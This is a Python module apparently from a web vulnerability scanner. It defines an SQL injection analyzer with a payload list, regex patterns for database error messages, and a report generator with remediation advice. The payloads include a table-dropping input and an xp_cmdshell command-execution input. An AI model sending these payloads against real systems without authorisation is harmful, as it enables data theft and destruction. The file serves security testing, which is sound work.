from typing import List
import re
from models.vulnerability import VulnerabilityTypesEnum, SeverityEnum
from .base import BaseAnalyzer
from .dto import VulnerabilityDTO, PayloadResult

class SQLiAnalyzer(BaseAnalyzer):
    """SQL Injection Analyzer"""
    
    def get_payloads(self) -> List[str]:
        """SQL Injection payloads"""
        return [
            # Error-based
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            
            # Boolean-based
            "1' AND '1'='1",
            "1' AND '1'='2",
            "admin' --",
            "admin' #",
            "' OR 1=1 --",
            
            # UNION-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # Time-based blind
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # MySQL specific
            "' OR 1=1 LIMIT 1--",
            "' OR '1'='1' LIMIT 1--",
            "' OR 'x'='x",
            
            # PostgreSQL specific  
            "' OR '1'='1'--",
            "'; SELECT pg_sleep(5)--",
            
            # MSSQL specific
            "' OR '1'='1'--",
            "'; EXEC xp_cmdshell('dir')--",
            
            # Obfuscation
            "' OR/**/'1'='1",
            "' OR/*comment*/'1'='1'--",
            "%27 OR %271%27=%271",
        ]
    
    def check_vulnerability(self, payload_result: PayloadResult) -> bool:
        """
        Проверяет наличие SQL Injection
        
        Методы детекта:
        1. SQL error messages в response
        2. Time-based (если response_time > 5 сек)
        3. Boolean-based (разница в content)
        """
        response = payload_result.response_body.lower()
        
        # 1. Error-based detection
        sql_errors = [
            r"sql syntax.*?error",
            r"mysql.*?error",
            r"warning.*?mysql",
            r"valid mysql result",
            r"mysqli.*?error",
            r"pg_query\(\).*?error",
            r"postgresql.*?error",
            r"odbc.*?error",
            r"microsoft sql.*?error",
            r"unclosed quotation mark",
            r"syntax error.*?at or near",
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"mysqlclient\.",
            r"oracle error",
            r"oci_execute",
            r"sqlite.*?error",
            r"sqlite3::",
            r"sqlstate",
            r"quoted string not properly terminated",
        ]
        
        for error_pattern in sql_errors:
            if re.search(error_pattern, response, re.IGNORECASE):
                # Сохраняем evidence
                match = re.search(error_pattern, response, re.IGNORECASE)
                evidence_start = max(0, match.start() - 50)
                evidence_end = min(len(response), match.end() + 100)
                payload_result.evidence = response[evidence_start:evidence_end]
                return True
        
        # 2. Time-based detection
        if 'sleep' in payload_result.payload.lower() or 'waitfor' in payload_result.payload.lower():
            if payload_result.response_time > 5.0:  # Если response больше 5 сек
                payload_result.evidence = f"Response time: {payload_result.response_time:.2f}s (expected >5s)"
                return True
        
        # 3. Boolean-based detection (если отличается от нормального response)
        # Этот метод требует baseline response, пока упрощаем
        
        return False
    
    def create_vulnerability(
        self, 
        url: str, 
        param: str, 
        method: str,
        successful_payload: PayloadResult
    ) -> VulnerabilityDTO:
        """Создает VulnerabilityDTO для SQLi"""
        
        # Определяем тип SQLi и severity
        severity = SeverityEnum.CRITICAL  # SQLi всегда критична
        
        sqli_type = "Error-based"
        if 'sleep' in successful_payload.payload.lower() or 'waitfor' in successful_payload.payload.lower():
            sqli_type = "Time-based Blind"
        elif 'union' in successful_payload.payload.lower():
            sqli_type = "UNION-based"
        
        name = f"SQL Injection ({sqli_type}) in '{param}' parameter"
        
        description = (
            f"SQL Injection vulnerability detected in {method} parameter '{param}'. "
            f"The application does not properly sanitize user input before using it in SQL queries, "
            f"allowing attacker to inject arbitrary SQL commands.\n\n"
            f"**Detection method:** {sqli_type}\n"
            f"**Payload used:** `{successful_payload.payload}`\n"
            f"**Evidence:** `{successful_payload.evidence[:200]}`\n\n"
            f"**Attack scenario:**\n"
            f"1. Attacker identifies injectable parameter\n"
            f"2. Crafts malicious SQL payload to extract data or modify database\n"
            f"3. Can read sensitive data (passwords, emails, credit cards)\n"
            f"4. Can modify/delete data or gain administrative access\n"
            f"5. In worst case - can execute OS commands on database server\n\n"
            f"**Impact:**\n"
            f"- Data breach (read entire database)\n"
            f"- Data manipulation (update/delete records)\n"
            f"- Authentication bypass\n"
            f"- Privilege escalation\n"
            f"- Potential remote code execution\n\n"
            f"**Recommendation:**\n"
            f"- Use parameterized queries (prepared statements)\n"
            f"- Use ORM frameworks properly\n"
            f"- Implement input validation with whitelist approach\n"
            f"- Apply principle of least privilege for database accounts\n"
            f"- Enable database query logging and monitoring\n"
            f"- Use Web Application Firewall (WAF)"
        )
        
        return VulnerabilityDTO(
            name=name,
            description=description,
            vuln_type=VulnerabilityTypesEnum.SQL_INJECT,
            severity=severity,
            url_path=url,
            parameter=param,
            method=method,
            payload=successful_payload.payload,
            evidence=successful_payload.evidence or "SQL error detected",
            all_payloads=[successful_payload],
            cwe_id='CWE-89'
        )
